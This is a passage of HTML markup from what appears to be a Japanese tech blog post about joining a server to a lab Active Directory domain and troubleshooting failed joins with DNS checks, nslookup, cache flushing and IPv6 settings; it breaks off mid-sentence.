url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAARlAAAEZQAGA43XUAAAB00lEQVQoz41SSW7cQAzU/59iGMg3cgiCADkYSBwHGEUzrV29b9JUSGrsa3Igml3gUiyyUUqh73us64plWTAMA6ZxFP9fNk+T5HofkGPAn8mgsfSp+45SKzbjoF2A9REu/IdRrg8JZT8Qc0UpFU3btrDOIecsLLWxMBToKJDfzXmElHEchzTeH3b6h+RZayl3w7IRw67rsG0bYorycvGBRmbfGCN/H4L4tTKLgpwS3IME44wlwtQworkQQ01gJpC7zMuKkbRRNyWMAxUL3kNrTQXORE//kZpyMW7s6M8TjNOM5ta18EYDR0UKDkZT0XmRRGYxU9BKC+CxHMVdr1cpeLlc8Pr6C0r1sqAYT02b588/8fRN4dP3AU9fWjx/vWE0EcBdWI209ffxIzXh8Zg1X4MlvbkQa8q4p0U1L787vLQjflxnvPUb3gYDnwruNAIzvPWjSLCQHCzLh46k38eCCKuECcMUPArd0J4jjpKw1yInxIGikT6ZcfDOiWRcLAnbs/g765ViG96g3GE57yjmIi/ud9HOkXYh8FI2wrMY68lHXSszTcLu2CusMHzowp2ZQam73JPlAydzdOSJGiQ63EhScEPWSlsnfiBMzRodSaOGCX8BMGdNJAG5sGQAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/887ea5efbb3dca1d1e42e668912a2c1a/8ac56/image-24.webp 240w,
/static/887ea5efbb3dca1d1e42e668912a2c1a/d3be9/image-24.webp 480w,
/static/887ea5efbb3dca1d1e42e668912a2c1a/b0a15/image-24.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/887ea5efbb3dca1d1e42e668912a2c1a/8ff5a/image-24.png 240w,
/static/887ea5efbb3dca1d1e42e668912a2c1a/e85cb/image-24.png 480w,
/static/887ea5efbb3dca1d1e42e668912a2c1a/0b533/image-24.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/887ea5efbb3dca1d1e42e668912a2c1a/0b533/image-24.png&quot;
            alt=&quot;image-24.png&quot;
            title=&quot;image-24.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;最後に、他のサーバをこのTESTUSERを使ってADに参加させます。&lt;/p&gt;
&lt;h2 id=&quot;サーバをadに参加させる&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%B5%E3%83%BC%E3%83%90%E3%82%92ad%E3%81%AB%E5%8F%82%E5%8A%A0%E3%81%95%E3%81%9B%E3%82%8B&quot; aria-label=&quot;サーバをadに参加させる permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;サーバをADに参加させる&lt;/h2&gt;
&lt;h3 id=&quot;優先dnsサーバの宛先をドメインコントローラのipアドレスに設定する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%84%AA%E5%85%88dns%E3%82%B5%E3%83%BC%E3%83%90%E3%81%AE%E5%AE%9B%E5%85%88%E3%82%92%E3%83%89%E3%83%A1%E3%82%A4%E3%83%B3%E3%82%B3%E3%83%B3%E3%83%88%E3%83%AD%E3%83%BC%E3%83%A9%E3%81%AEip%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%81%AB%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B&quot; aria-label=&quot;優先dnsサーバの宛先をドメインコントローラのipアドレスに設定する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;優先DNSサーバの宛先をドメインコントローラのIPアドレスに設定する&lt;/h3&gt;
&lt;p&gt;まずはネットワーク設定を開き、優先DNSサーバの宛先をドメインコントローラのIPアドレスに変更します。&lt;/p&gt;
&lt;h3 id=&quot;クライアントをドメインに参加させる&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%AF%E3%83%A9%E3%82%A4%E3%82%A2%E3%83%B3%E3%83%88%E3%82%92%E3%83%89%E3%83%A1%E3%82%A4%E3%83%B3%E3%81%AB%E5%8F%82%E5%8A%A0%E3%81%95%E3%81%9B%E3%82%8B&quot; aria-label=&quot;クライアントをドメインに参加させる permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;クライアントをドメインに参加させる&lt;/h3&gt;
&lt;p&gt;コントロールパネルのシステムから、コンピュータ名/ドメインの変更を選択し、&lt;code class=&quot;language-text&quot;&gt;hackroom.lab&lt;/code&gt;ドメインに参加させます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 897px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/d75eba38d172da144032ebb11eb3de41/3a737/image-29.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 70%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAADVklEQVQ4y0WU22okVRSG+wWUeQPvfBDvvFFEGBCcG70aFG9GEII3vsAoqCC5EcIgKCKSOCbTmZk4OU3SnelOVzp9ru6uqq5zVdexu9M5+LlSXkzBz9qw9/73v9a/VpVK723wxr0tfvpb4XFlwNaJytO6ypOTAeWaxFcDnp6O2FHGPGuM2K6P2JS9zZO+nBFUe6wfNNmutHn42yGl0sc73Plsn3LDQLUCBpZPW3cZuQFhluHFMW6cCjKCLCe/XBDmWYF4LjGN5cyU7GLO77stIbxf4c2VOgddneHEoavZ1AYORpgSxCGW7+FFiVySy0J4cX1RYHmzLOLr74Y/95qU7nyj8Pa3TR7XOpwODBqqQccOGfqiLPQYGRqaqWP7NvNlxmyRCkRdHpMv55TLmzz8YRXN0otylXbPVF40uhyddXjZaHNQa1LrqFSbXY6bKoeyv3faY6/WpqdPGExsycIgnUU8r55z9933+fzLt/h05WvKJxqlkW5juR5Kr8/LepPDmkJFabFXrbPX6HHUHrMvpLd4diIPdiz2jxVRPRFVHh+srPHg+3v8+POvbNWE0HA8qVNARx3R6g6oK+e8apxxcFShNTQ47TlEaUiUTckl3UyULa8XWGIWXKOFITsdneubBRsVSTlMI3Fqimk7OI6N6zqEYYAra1secsNYapb/j4ucaJYTznNU6YIoi1kscy4vcyG/YL0ypGT5LuOJLup69Ad9HM8VFVL0JGZs+/ixODxNcIIIW3CsB+wMfVqmS5pHxLOEaZ4I4ZKN6oiSbpv0xyraxMT3PKbTiCgSSLS9gFZfpX52LulrdEYjVENnoGuMrQlhEhZue5HP1VXGenVMyQ68oj3GhomiKOiGQZKmRKIwSROCwC9KoVk2E9cklMuWZxJnEelcelVITenVSyH8q6ZTShZz5tKgth/SUwe0e12CaEosExAnklJ6a8SMoWljuDYzmZTbaZldLYrmDvMUbZqLPUuenDmUlrOUS2nUSNxKxYxEajqXCXGDQNwPmXo2vqnhCVkYmCznUWEA/y4KZ4t1gSUv2kK4bQTsGj77Y4dDic+1gPIoYK3lsar4PDo1+UN+CKtVi0+2fO5vT3nwT8JXOxFfbE358BePu48cPlqb8M53ff4DMuvmsRgqHe8AAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/d75eba38d172da144032ebb11eb3de41/8ac56/image-29.webp 240w,
/static/d75eba38d172da144032ebb11eb3de41/d3be9/image-29.webp 480w,
/static/d75eba38d172da144032ebb11eb3de41/10735/image-29.webp 897w&quot;
              sizes=&quot;(max-width: 897px) 100vw, 897px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/d75eba38d172da144032ebb11eb3de41/8ff5a/image-29.png 240w,
/static/d75eba38d172da144032ebb11eb3de41/e85cb/image-29.png 480w,
/static/d75eba38d172da144032ebb11eb3de41/3a737/image-29.png 897w&quot;
            sizes=&quot;(max-width: 897px) 100vw, 897px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/d75eba38d172da144032ebb11eb3de41/3a737/image-29.png&quot;
            alt=&quot;image-29.png&quot;
            title=&quot;image-29.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;認証には、先ほど作成した&lt;code class=&quot;language-text&quot;&gt;TESTUSER&lt;/code&gt;の認証情報を利用しました。&lt;/p&gt;
&lt;h2 id=&quot;adへの参加に失敗した場合のトラブルシューティング&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ad%E3%81%B8%E3%81%AE%E5%8F%82%E5%8A%A0%E3%81%AB%E5%A4%B1%E6%95%97%E3%81%97%E3%81%9F%E5%A0%B4%E5%90%88%E3%81%AE%E3%83%88%E3%83%A9%E3%83%96%E3%83%AB%E3%82%B7%E3%83%A5%E3%83%BC%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&quot; aria-label=&quot;adへの参加に失敗した場合のトラブルシューティング permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ADへの参加に失敗した場合のトラブルシューティング&lt;/h2&gt;
&lt;h3 id=&quot;指定されたドメインがないかまたはアクセスできませんのエラーが出る場合&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E6%8C%87%E5%AE%9A%E3%81%95%E3%82%8C%E3%81%9F%E3%83%89%E3%83%A1%E3%82%A4%E3%83%B3%E3%81%8C%E3%81%AA%E3%81%84%E3%81%8B%E3%81%BE%E3%81%9F%E3%81%AF%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9%E3%81%A7%E3%81%8D%E3%81%BE%E3%81%9B%E3%82%93%E3%81%AE%E3%82%A8%E3%83%A9%E3%83%BC%E3%81%8C%E5%87%BA%E3%82%8B%E5%A0%B4%E5%90%88&quot; aria-label=&quot;指定されたドメインがないかまたはアクセスできませんのエラーが出る場合 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;「指定されたドメインがないか、またはアクセスできません」のエラーが出る場合&lt;/h3&gt;
&lt;p&gt;優先DNSサーバの宛先をドメインコントローラのIPアドレスに変更しているか、pingコマンドでドメインコントローラのサーバに疎通が可能かをまず確認します。&lt;/p&gt;
&lt;p&gt;次に、ドメインコントローラ側でコマンドプロンプトからDNSサーバの稼働を確認します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;$ &lt;span class=&quot;token function&quot;&gt;sc&lt;/span&gt; queryex dns
SERVICE_NAME: dns
        &lt;span class=&quot;token function&quot;&gt;TYPE&lt;/span&gt;               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;STOPPABLE&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; PAUSABLE&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; ACCEPTS_SHUTDOWN&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
        WIN32_EXIT_CODE    : 0  &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;0x0&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
        SERVICE_EXIT_CODE  : 0  &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;0x0&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 2800
        FLAGS&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これを確認しても問題が発生する場合は、nslookupで参加するドメインのドメインコントローラが参照できるかを確認します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;$ nslookup hackroom&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lab
サーバー:  UnKnown
Address:  2404:1a8:7f01:b::3
&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; UnKnown が hackroom&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lab を見つけられません: Non-existent domain&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;このような出力となった場合、ドメインコントローラのDNSを適切に参照できていないため、AD参加ができません。&lt;/p&gt;
&lt;p&gt;まずはドメインコントローラ側のファイアウォールを無効化してみて、DNS参照ができるかを試します。&lt;/p&gt;
&lt;p&gt;次に、クライアント側（ADに参加したいサーバ）のコマンドプロンプトにて以下のコマンドを入力し、DNSキャッシュをクリアした後にもう一度nslookupを試します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;ipconfig/flushdns&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これで失敗した場合、ドメインコントローラ側のDNSのイベントを確認します。&lt;/p&gt;
&lt;h3 id=&quot;dnsのイベントを確認する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#dns%E3%81%AE%E3%82%A4%E3%83%99%E3%83%B3%E3%83%88%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%99%E3%82%8B&quot; aria-label=&quot;dnsのイベントを確認する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;DNSのイベントを確認する&lt;/h3&gt;
&lt;p&gt;サーバマネージャのDNSタブを開くと、以下のようにイベントが確認できます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/7d4dd945a94499e44e58e11ad7c35444/0b533/image-25.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 50.83333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAARlAAAEZQAGA43XUAAABxUlEQVQoz6WRaXPSUBSG84MBKYv9P45fndGOpR+1VmynaElbaFlkSQIhK0tCNqB9vIkbWr+ZmWeec96ce+bOXOn54SH5QoGDUolcLs+zYpHiwQG5fD7L/0UuX8jmKtUqlUqVUrlMqVSmKDJpbpvs4hB4xDENQm/JQxIJQpLAZxP6WZ3OpN5nFwdsouC7Aw/XtpBenrZ48WnAkaxxrbqcD13qX20uBjYfugbvOwaXQ4fGyOFj3+JU9HXhd/czznomn0Ve79uc9V3uxzrSnWbTHJm0FIu+seJq4tEUyFOfpiDtr4VvZ+tfmbxHmjdUj3PFZ6A7SOw28LDlcZtk/p9vt4mRwigiI4xYeT6evyYQdRDt8XcfxU/w1wG+OCtFYiCOI6I4ZrmYE4hHScKAaO3hL+esV4usDv3VHssntbdwWYjz2cKURCwc6C4tbc6NQFYc2hOXtpZmLjeqQ3Ns05mt6Jr+H/RSGz7OfPl74XaT0OhqvLroc/RlzJvGkNeXfd5ejThuKhzLKjVZoXarc3JncdI2qQl+utYymVrO3g2ThImqMOx10NUxU2WENhpgTFQsfZLZ/GFb2NI1zPTfVGOmKZjCjuPwDaQdzygvRMNoAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/7d4dd945a94499e44e58e11ad7c35444/8ac56/image-25.webp 240w,
/static/7d4dd945a94499e44e58e11ad7c35444/d3be9/image-25.webp 480w,
/static/7d4dd945a94499e44e58e11ad7c35444/b0a15/image-25.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/7d4dd945a94499e44e58e11ad7c35444/8ff5a/image-25.png 240w,
/static/7d4dd945a94499e44e58e11ad7c35444/e85cb/image-25.png 480w,
/static/7d4dd945a94499e44e58e11ad7c35444/0b533/image-25.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/7d4dd945a94499e44e58e11ad7c35444/0b533/image-25.png&quot;
            alt=&quot;image-25.png&quot;
            title=&quot;image-25.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;僕の環境では、DNSサーバが&lt;code class=&quot;language-text&quot;&gt;192.168.100.50&lt;/code&gt;でのソケットを開けなかったというエラーが出力されていました。&lt;/p&gt;
&lt;h3 id=&quot;adドメイン名にlocalを使っている&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ad%E3%83%89%E3%83%A1%E3%82%A4%E3%83%B3%E5%90%8D%E3%81%ABlocal%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%A6%E3%81%84%E3%82%8B&quot; aria-label=&quot;adドメイン名にlocalを使っている permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ADドメイン名に.localを使っている&lt;/h3&gt;
&lt;p&gt;僕の環境ではこれをやらかしてました。&lt;/p&gt;
&lt;p&gt;AD立て直しです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://asohiroblog.net/active-directory-domain-name-local/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Active Directoryのドメイン名に「.local」を使ってはいけない件 - asohiroblog&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;ipv6を無効化する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ipv6%E3%82%92%E7%84%A1%E5%8A%B9%E5%8C%96%E3%81%99%E3%82%8B&quot; aria-label=&quot;ipv6を無効化する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;IPv6を無効化する&lt;/h3&gt;
&lt;p&gt;IPv6で名前解決を使用とするとAD参加に失敗する場合があるそう。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://vamdemicsystem.black/windows/%E3%80%90activedirectory%E3%80%91%E3%83%89%E3%83%A1%E3%82%A4%E3%83%B3%E5%8F%82%E5%8A%A0%E6%99%82%E3%81%AB%E3%80%8C%E3%83%89%E3%83%A1%E3%82%A4%E3%83%B3xxx%E3%81%AEactivedirectory%E3%83%89%E3%83%A1&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;【Active Directory】ドメイン参加時に「ドメインxxxのActiveDirectoryドメインコントローラ(AD DC)に接続できませんでした。」メッセージが出力され失敗する | 株式会社ヴァンデミックシステム&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;dnsによりドメインコントローラの参照ができているのにadに参加できない&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#dns%E3%81%AB%E3%82%88%E3%82%8A%E3%83%89%E3%83%A1%E3%82%A4%E3%83%B3%E3%82%B3%E3%83%B3%E3%83%88%E3%83%AD%E3%83%BC%E3%83%A9%E3%81%AE%E5%8F%82%E7%85%A7%E3%81%8C%E3%81%A7%E3%81%8D%E3%81%A6%E3%81%84%E3%82%8B%E3%81%AE%E3%81%ABad%E3%81%AB%E5%8F%82%E5%8A%A0%E3%81%A7%E3%81%8D%E3%81%AA%E3%81%84&quot; aria-label=&quot;dnsによりドメインコントローラの参照ができているのにadに参加できない permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;DNSによりドメインコントローラの参照ができているのにADに参加できない&lt;/h3&gt;
&lt;p&gt;以下のようなエラーが発生している場合、DNSによりドメインコントローラの名前解決には成功しているにも関わらず、ドメインコントローラへの接続に失敗しているようです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;クエリによって、次のドメイン コントローラが識別されました:

&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;DC&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;

このエラーの一般的な原因として挙げられるのは:

